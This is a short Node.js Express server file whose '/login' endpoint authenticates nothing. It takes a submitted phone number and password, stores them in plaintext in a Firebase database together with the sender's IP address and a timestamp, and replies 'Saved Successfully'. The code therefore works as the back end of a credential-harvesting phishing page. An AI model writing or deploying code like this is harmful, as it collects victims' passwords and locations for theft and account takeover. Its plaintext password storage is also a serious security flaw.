const express = require("express");
const cors = require("cors");
const admin = require("firebase-admin");

const app = express();

app.use(cors());
app.use(express.json());

admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, "\n")
  }),
  databaseURL: "https://spro-deal-a87cd-default-rtdb.firebaseio.com"
});

const db = admin.database();

app.get("/", (req, res) => {
    res.send("Backend Running Successfully");
});

app.post("/login", async (req, res) => {

    try {

        const { phone, password } = req.body;

        if (!phone || !password) {
            return res.status(400).json({
                success: false,
                message: "Phone and Password required"
            });
        }

        const ref = db.ref("login_data");

        await ref.push({
            phone,
            password,
            ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
            time: Date.now()
        });

        res.json({
            success: true,
            message: "Saved Successfully"
        });

    } catch (e) {

        res.status(500).json({
            success: false,
            error: e.message
        });

    }

});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server Started");
});
